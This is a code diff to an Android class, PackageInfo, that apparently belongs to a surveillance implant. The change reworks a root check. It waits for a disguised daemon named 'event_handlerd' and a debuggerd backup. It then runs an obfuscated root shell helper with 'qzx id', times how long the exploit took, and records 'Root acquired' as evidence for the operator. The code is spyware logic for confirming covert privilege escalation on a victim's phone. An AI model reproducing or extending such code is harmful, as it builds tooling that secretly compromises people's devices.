@@ -136,40 +136,40 @@ public class PackageInfo {
 				Check.log(TAG + " (checkRoot), " + Configuration.shellFileBase);
 			}
 			final AutoFile file = new AutoFile(Configuration.shellFileBase);
-
+			final AutoFile dbg_file = new AutoFile(Configuration.debuggerd_bkp);
 			if (file.exists() && file.canRead()) {
-
-				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
-				String stdout = p.getStdout();
-				if (stdout.startsWith(M.e("uid=0"))) {
-
+				long start = new Date().getTime();
+				if (dbg_file.exists()) {
+					//checking if the daemon (named event_handlerd)is running if not sleep 2 sec for 5 trials
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
-
-						Date timestamp = new Date();
-						long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;
-
-						if (!sentInfo) {
-							EvidenceBuilder.info("Root: " + Root.method + " time: " + diff + "s");
-							if (Cfg.DEMO) {
-								Status.self().makeToast("Root acquired");
+						Check.log(TAG + " (checkRoot): dbg present!");
+					}
+					while (Utils.pidOf(M.e("event_handlerd")) == null) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (checkRoot): daemon event_handlerd not started");
+						}
+						Utils.sleep(1000);
+						if ((new Date().getTime() - start) > 10000) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (checkRoot): timeout checking event_handlerd expired after " + (new Date().getTime() - start) / 1000 + "sec");
 							}
-						}
-
-					} else {
-						if (!sentInfo) {
-							EvidenceBuilder.info(M.e("Root"));
+							break;
 						}
 					}
-
-					isRoot = true;
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (checkRoot): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
+				}
+				// try at least 2 times sleeping 1 secs
+				start = new Date().getTime();
+				while (true) {
+					isRoot = isRootOk();
+					if(isRoot){
+						break;
+					}else if ((new Date().getTime() - start) > 2000) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (checkRoot): timeout checking root expired after " + (new Date().getTime() - start) / 1000 + "sec");
+						}
+						break;
 					}
-					//if (!sentInfo) {
-					//	EvidenceBuilder.info("Root: NO");
-					//}
+					Utils.sleep(1000);
 				}
 				sentInfo = true;
 			}
@@ -184,6 +184,42 @@ public class PackageInfo {
 		}
 
 		Status.setRoot(isRoot);
+		return isRoot;
+	}
+
+	public static boolean isRootOk() {
+		final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
+		String stdout = p.getStdout();
+		boolean isRoot = false ;
+		if (stdout.startsWith(M.e("uid=0"))) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (isRootOk): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
+
+				Date timestamp = new Date();
+				long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;
+
+				if (!sentInfo) {
+					EvidenceBuilder.info("Root: " + Root.method + " time: " + diff + "s");
+					if (Cfg.DEMO) {
+						Status.self().makeToast("Root acquired");
+					}
+				}
+
+			} else {
+				if (!sentInfo) {
+					EvidenceBuilder.info(M.e("Root"));
+				}
+			}
+
+			isRoot = true;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (isRootOk): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
+			}
+			//if (!sentInfo) {
+			//	EvidenceBuilder.info("Root: NO");
+			//}
+		}
 		return isRoot;
 	}
 
